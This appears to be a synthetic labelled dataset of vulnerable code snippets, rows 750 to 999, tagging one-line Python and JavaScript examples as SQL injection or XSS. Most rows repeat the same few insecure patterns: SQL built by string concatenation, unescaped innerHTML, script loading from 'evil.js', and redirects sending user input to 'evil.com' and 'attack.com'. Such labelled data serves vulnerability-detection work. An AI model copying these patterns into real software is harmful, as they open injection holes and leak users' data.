+ROW-750,XSS,javascript,line_13_750.js,snippet_750,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-751,SQLi,python,line_7_751.py,snippet_751,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-752,SQLi,python,line_8_752.py,snippet_752,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-753,XSS,javascript,line_17_753.js,snippet_753,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-754,SQLi,javascript,line_5_754.js,snippet_754,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-755,XSS,javascript,line_17_755.js,snippet_755,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-756,SQLi,javascript,line_20_756.js,snippet_756,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-757,XSS,javascript,line_8_757.js,snippet_757,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-758,XSS,javascript,line_11_758.js,snippet_758,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-759,XSS,javascript,line_5_759.js,snippet_759,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-760,SQLi,javascript,line_4_760.js,snippet_760,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-761,XSS,javascript,line_16_761.js,snippet_761,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-762,XSS,javascript,line_15_762.js,snippet_762,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-763,SQLi,python,line_5_763.py,snippet_763,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-764,XSS,javascript,line_14_764.js,snippet_764,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-765,XSS,javascript,line_18_765.js,snippet_765,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-766,XSS,javascript,line_17_766.js,snippet_766,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-767,SQLi,python,line_15_767.py,snippet_767,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-768,SQLi,python,line_8_768.py,snippet_768,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-769,XSS,javascript,line_8_769.js,snippet_769,alert('Hello ' + user_input);,,,,,statement
+ROW-770,XSS,javascript,line_2_770.js,snippet_770,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-771,SQLi,python,line_17_771.py,snippet_771,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-772,SQLi,python,line_7_772.py,snippet_772,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-773,SQLi,javascript,line_4_773.js,snippet_773,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-774,XSS,javascript,line_4_774.js,snippet_774,alert('Hello ' + user_input);,,,,,statement
+ROW-775,XSS,javascript,line_15_775.js,snippet_775,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-776,SQLi,python,line_5_776.py,snippet_776,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-777,SQLi,python,line_10_777.py,snippet_777,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-778,SQLi,python,line_6_778.py,snippet_778,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-779,SQLi,python,line_2_779.py,snippet_779,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-780,XSS,javascript,line_19_780.js,snippet_780,alert('Hello ' + user_input);,,,,,statement
+ROW-781,XSS,javascript,line_13_781.js,snippet_781,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-782,XSS,javascript,line_1_782.js,snippet_782,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-783,SQLi,python,line_17_783.py,snippet_783,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-784,XSS,javascript,line_18_784.js,snippet_784,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-785,SQLi,javascript,line_7_785.js,snippet_785,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-786,XSS,javascript,line_2_786.js,snippet_786,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-787,SQLi,python,line_12_787.py,snippet_787,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-788,SQLi,python,line_5_788.py,snippet_788,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-789,SQLi,python,line_16_789.py,snippet_789,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-790,SQLi,python,line_7_790.py,snippet_790,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-791,XSS,javascript,line_4_791.js,snippet_791,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-792,XSS,javascript,line_5_792.js,snippet_792,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-793,SQLi,python,line_9_793.py,snippet_793,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-794,SQLi,python,line_10_794.py,snippet_794,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-795,SQLi,python,line_2_795.py,snippet_795,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-796,SQLi,python,line_8_796.py,snippet_796,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-797,SQLi,python,line_1_797.py,snippet_797,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-798,XSS,javascript,line_3_798.js,snippet_798,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-799,SQLi,python,line_9_799.py,snippet_799,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-800,XSS,javascript,line_7_800.js,snippet_800,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-801,SQLi,python,line_8_801.py,snippet_801,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-802,XSS,javascript,line_9_802.js,snippet_802,alert('Hello ' + user_input);,,,,,statement
+ROW-803,XSS,javascript,line_20_803.js,snippet_803,alert('Hello ' + user_input);,,,,,statement
+ROW-804,XSS,javascript,line_8_804.js,snippet_804,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-805,SQLi,python,line_2_805.py,snippet_805,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-806,XSS,javascript,line_13_806.js,snippet_806,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-807,SQLi,python,line_14_807.py,snippet_807,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-808,SQLi,python,line_15_808.py,snippet_808,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-809,XSS,javascript,line_20_809.js,snippet_809,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-810,XSS,javascript,line_3_810.js,snippet_810,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-811,XSS,javascript,line_5_811.js,snippet_811,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-812,XSS,javascript,line_2_812.js,snippet_812,alert('Hello ' + user_input);,,,,,statement
+ROW-813,XSS,javascript,line_18_813.js,snippet_813,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-814,SQLi,python,line_16_814.py,snippet_814,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-815,XSS,javascript,line_17_815.js,snippet_815,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-816,XSS,javascript,line_19_816.js,snippet_816,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-817,XSS,javascript,line_10_817.js,snippet_817,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-818,XSS,javascript,line_17_818.js,snippet_818,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-819,SQLi,javascript,line_3_819.js,snippet_819,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-820,XSS,javascript,line_4_820.js,snippet_820,alert('Hello ' + user_input);,,,,,statement
+ROW-821,XSS,javascript,line_2_821.js,snippet_821,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-822,XSS,javascript,line_19_822.js,snippet_822,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-823,SQLi,python,line_15_823.py,snippet_823,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-824,SQLi,python,line_15_824.py,snippet_824,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-825,SQLi,python,line_10_825.py,snippet_825,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-826,SQLi,javascript,line_16_826.js,snippet_826,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-827,XSS,javascript,line_6_827.js,snippet_827,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-828,SQLi,python,line_1_828.py,snippet_828,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-829,XSS,javascript,line_13_829.js,snippet_829,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-830,SQLi,python,line_5_830.py,snippet_830,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-831,XSS,javascript,line_9_831.js,snippet_831,alert('Hello ' + user_input);,,,,,statement
+ROW-832,SQLi,python,line_13_832.py,snippet_832,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-833,SQLi,python,line_1_833.py,snippet_833,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-834,SQLi,python,line_14_834.py,snippet_834,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-835,XSS,javascript,line_12_835.js,snippet_835,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-836,SQLi,python,line_1_836.py,snippet_836,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-837,XSS,javascript,line_20_837.js,snippet_837,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-838,XSS,javascript,line_15_838.js,snippet_838,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-839,SQLi,python,line_17_839.py,snippet_839,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-840,SQLi,python,line_14_840.py,snippet_840,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-841,SQLi,python,line_10_841.py,snippet_841,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-842,SQLi,python,line_8_842.py,snippet_842,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-843,SQLi,javascript,line_16_843.js,snippet_843,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-844,XSS,javascript,line_9_844.js,snippet_844,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-845,SQLi,python,line_7_845.py,snippet_845,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-846,SQLi,javascript,line_10_846.js,snippet_846,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-847,SQLi,python,line_5_847.py,snippet_847,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-848,XSS,javascript,line_13_848.js,snippet_848,alert('Hello ' + user_input);,,,,,statement
+ROW-849,SQLi,python,line_2_849.py,snippet_849,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-850,XSS,javascript,line_20_850.js,snippet_850,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-851,XSS,javascript,line_4_851.js,snippet_851,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-852,SQLi,python,line_8_852.py,snippet_852,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-853,XSS,javascript,line_7_853.js,snippet_853,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-854,SQLi,python,line_18_854.py,snippet_854,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-855,SQLi,python,line_19_855.py,snippet_855,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-856,XSS,javascript,line_11_856.js,snippet_856,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-857,SQLi,python,line_5_857.py,snippet_857,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-858,XSS,javascript,line_10_858.js,snippet_858,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-859,SQLi,python,line_14_859.py,snippet_859,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-860,SQLi,javascript,line_11_860.js,snippet_860,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-861,SQLi,python,line_8_861.py,snippet_861,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-862,XSS,javascript,line_8_862.js,snippet_862,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-863,SQLi,python,line_18_863.py,snippet_863,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-864,SQLi,python,line_2_864.py,snippet_864,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-865,SQLi,javascript,line_13_865.js,snippet_865,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-866,SQLi,python,line_18_866.py,snippet_866,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-867,SQLi,python,line_18_867.py,snippet_867,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-868,SQLi,python,line_20_868.py,snippet_868,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-869,SQLi,python,line_1_869.py,snippet_869,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-870,SQLi,python,line_12_870.py,snippet_870,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-871,SQLi,python,line_7_871.py,snippet_871,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-872,SQLi,python,line_6_872.py,snippet_872,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-873,XSS,javascript,line_15_873.js,snippet_873,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-874,SQLi,javascript,line_7_874.js,snippet_874,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-875,XSS,javascript,line_1_875.js,snippet_875,alert('Hello ' + user_input);,,,,,statement
+ROW-876,SQLi,python,line_18_876.py,snippet_876,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-877,SQLi,python,line_9_877.py,snippet_877,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-878,XSS,javascript,line_5_878.js,snippet_878,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-879,XSS,javascript,line_3_879.js,snippet_879,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-880,SQLi,python,line_4_880.py,snippet_880,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-881,SQLi,python,line_15_881.py,snippet_881,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-882,SQLi,python,line_15_882.py,snippet_882,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-883,SQLi,python,line_1_883.py,snippet_883,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-884,XSS,javascript,line_15_884.js,snippet_884,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-885,SQLi,python,line_2_885.py,snippet_885,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-886,SQLi,python,line_20_886.py,snippet_886,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-887,SQLi,python,line_11_887.py,snippet_887,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-888,SQLi,python,line_3_888.py,snippet_888,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-889,XSS,javascript,line_9_889.js,snippet_889,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-890,SQLi,python,line_20_890.py,snippet_890,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-891,XSS,javascript,line_2_891.js,snippet_891,alert('Hello ' + user_input);,,,,,statement
+ROW-892,XSS,javascript,line_17_892.js,snippet_892,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-893,XSS,javascript,line_9_893.js,snippet_893,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-894,SQLi,python,line_5_894.py,snippet_894,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-895,SQLi,javascript,line_14_895.js,snippet_895,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-896,XSS,javascript,line_14_896.js,snippet_896,alert('Hello ' + user_input);,,,,,statement
+ROW-897,XSS,javascript,line_4_897.js,snippet_897,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-898,SQLi,python,line_7_898.py,snippet_898,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-899,SQLi,python,line_17_899.py,snippet_899,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-900,XSS,javascript,line_6_900.js,snippet_900,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-901,XSS,javascript,line_16_901.js,snippet_901,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-902,XSS,javascript,line_19_902.js,snippet_902,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-903,SQLi,javascript,line_17_903.js,snippet_903,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-904,SQLi,python,line_18_904.py,snippet_904,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-905,XSS,javascript,line_17_905.js,snippet_905,alert('Hello ' + user_input);,,,,,statement
+ROW-906,SQLi,javascript,line_8_906.js,snippet_906,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-907,XSS,javascript,line_12_907.js,snippet_907,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-908,SQLi,python,line_16_908.py,snippet_908,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-909,XSS,javascript,line_13_909.js,snippet_909,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-910,XSS,javascript,line_3_910.js,snippet_910,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-911,XSS,javascript,line_2_911.js,snippet_911,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-912,XSS,javascript,line_3_912.js,snippet_912,alert('Hello ' + user_input);,,,,,statement
+ROW-913,XSS,javascript,line_1_913.js,snippet_913,alert('Hello ' + user_input);,,,,,statement
+ROW-914,XSS,javascript,line_12_914.js,snippet_914,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-915,XSS,javascript,line_16_915.js,snippet_915,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-916,XSS,javascript,line_5_916.js,snippet_916,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-917,XSS,javascript,line_12_917.js,snippet_917,alert('Hello ' + user_input);,,,,,statement
+ROW-918,SQLi,python,line_9_918.py,snippet_918,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-919,SQLi,javascript,line_19_919.js,snippet_919,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-920,XSS,javascript,line_10_920.js,snippet_920,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-921,SQLi,python,line_19_921.py,snippet_921,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-922,XSS,javascript,line_7_922.js,snippet_922,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-923,SQLi,javascript,line_5_923.js,snippet_923,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-924,SQLi,python,line_2_924.py,snippet_924,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-925,SQLi,python,line_15_925.py,snippet_925,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-926,XSS,javascript,line_1_926.js,snippet_926,alert('Hello ' + user_input);,,,,,statement
+ROW-927,SQLi,javascript,line_2_927.js,snippet_927,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-928,XSS,javascript,line_20_928.js,snippet_928,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-929,SQLi,python,line_15_929.py,snippet_929,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-930,SQLi,python,line_12_930.py,snippet_930,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-931,SQLi,python,line_13_931.py,snippet_931,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-932,XSS,javascript,line_16_932.js,snippet_932,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-933,XSS,javascript,line_10_933.js,snippet_933,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-934,SQLi,python,line_16_934.py,snippet_934,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-935,XSS,javascript,line_2_935.js,snippet_935,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-936,SQLi,python,line_9_936.py,snippet_936,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-937,XSS,javascript,line_19_937.js,snippet_937,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-938,XSS,javascript,line_9_938.js,snippet_938,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-939,SQLi,python,line_6_939.py,snippet_939,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-940,SQLi,python,line_7_940.py,snippet_940,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-941,XSS,javascript,line_2_941.js,snippet_941,alert('Hello ' + user_input);,,,,,statement
+ROW-942,XSS,javascript,line_14_942.js,snippet_942,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-943,XSS,javascript,line_9_943.js,snippet_943,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-944,XSS,javascript,line_18_944.js,snippet_944,alert('Hello ' + user_input);,,,,,statement
+ROW-945,XSS,javascript,line_16_945.js,snippet_945,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-946,SQLi,python,line_16_946.py,snippet_946,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-947,XSS,javascript,line_1_947.js,snippet_947,alert('Hello ' + user_input);,,,,,statement
+ROW-948,XSS,javascript,line_4_948.js,snippet_948,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-949,XSS,javascript,line_1_949.js,snippet_949,alert('Hello ' + user_input);,,,,,statement
+ROW-950,SQLi,python,line_12_950.py,snippet_950,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-951,XSS,javascript,line_12_951.js,snippet_951,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-952,SQLi,javascript,line_18_952.js,snippet_952,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-953,XSS,javascript,line_3_953.js,snippet_953,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-954,XSS,javascript,line_20_954.js,snippet_954,alert('Hello ' + user_input);,,,,,statement
+ROW-955,SQLi,python,line_20_955.py,snippet_955,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-956,XSS,javascript,line_4_956.js,snippet_956,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-957,XSS,javascript,line_2_957.js,snippet_957,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-958,SQLi,python,line_8_958.py,snippet_958,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-959,SQLi,python,line_11_959.py,snippet_959,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-960,XSS,javascript,line_20_960.js,snippet_960,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-961,XSS,javascript,line_6_961.js,snippet_961,alert('Hello ' + user_input);,,,,,statement
+ROW-962,SQLi,python,line_9_962.py,snippet_962,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-963,SQLi,python,line_15_963.py,snippet_963,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-964,XSS,javascript,line_14_964.js,snippet_964,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-965,SQLi,javascript,line_4_965.js,snippet_965,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-966,SQLi,python,line_11_966.py,snippet_966,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-967,XSS,javascript,line_2_967.js,snippet_967,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-968,SQLi,python,line_12_968.py,snippet_968,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-969,XSS,javascript,line_9_969.js,snippet_969,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-970,XSS,javascript,line_16_970.js,snippet_970,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-971,XSS,javascript,line_12_971.js,snippet_971,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-972,XSS,javascript,line_20_972.js,snippet_972,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-973,XSS,javascript,line_11_973.js,snippet_973,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-974,XSS,javascript,line_3_974.js,snippet_974,alert('Hello ' + user_input);,,,,,statement
+ROW-975,XSS,javascript,line_5_975.js,snippet_975,alert('Hello ' + user_input);,,,,,statement
+ROW-976,XSS,javascript,line_3_976.js,snippet_976,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-977,SQLi,python,line_3_977.py,snippet_977,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-978,SQLi,python,line_20_978.py,snippet_978,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-979,XSS,javascript,line_13_979.js,snippet_979,alert('Hello ' + user_input);,,,,,statement
+ROW-980,SQLi,python,line_16_980.py,snippet_980,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-981,XSS,javascript,line_4_981.js,snippet_981,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-982,SQLi,python,line_2_982.py,snippet_982,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-983,SQLi,python,line_14_983.py,snippet_983,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-984,XSS,javascript,line_5_984.js,snippet_984,"document.write('<script src=""evil.js""></script>');",,,,,statement
+ROW-985,SQLi,python,line_13_985.py,snippet_985,cursor.execute('SELECT * FROM users WHERE username = ' + user_input),,,,,statement
+ROW-986,XSS,javascript,line_20_986.js,snippet_986,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-987,XSS,javascript,line_4_987.js,snippet_987,document.getElementById('input').innerHTML = user_input;,,,,,statement
+ROW-988,XSS,javascript,line_6_988.js,snippet_988,document.location = 'http://evil.com?username=' + user_input;,,,,,statement
+ROW-989,SQLi,python,line_1_989.py,snippet_989,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-990,XSS,javascript,line_11_990.js,snippet_990,alert('Hello ' + user_input);,,,,,statement
+ROW-991,XSS,javascript,line_14_991.js,snippet_991,window.location.href = 'http://attack.com?user=' + user_input;,,,,,statement
+ROW-992,SQLi,python,line_14_992.py,snippet_992,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-993,SQLi,python,line_6_993.py,snippet_993,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-994,SQLi,python,line_3_994.py,snippet_994,db.execute('SELECT * FROM employees WHERE id = ' + user_input),,,,,statement
+ROW-995,SQLi,python,line_12_995.py,snippet_995,db.execute('SELECT * FROM products WHERE product_id = ' + product_input),,,,,statement
+ROW-996,SQLi,javascript,line_9_996.js,snippet_996,connection.query('SELECT * FROM users WHERE username = ' + input_string),,,,,statement
+ROW-997,XSS,javascript,line_16_997.js,snippet_997,alert('Hello ' + user_input);,,,,,statement
+ROW-998,SQLi,python,line_17_998.py,snippet_998,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
+ROW-999,SQLi,python,line_12_999.py,snippet_999,query = 'SELECT * FROM customers WHERE email = ' + email_input,,,,,statement
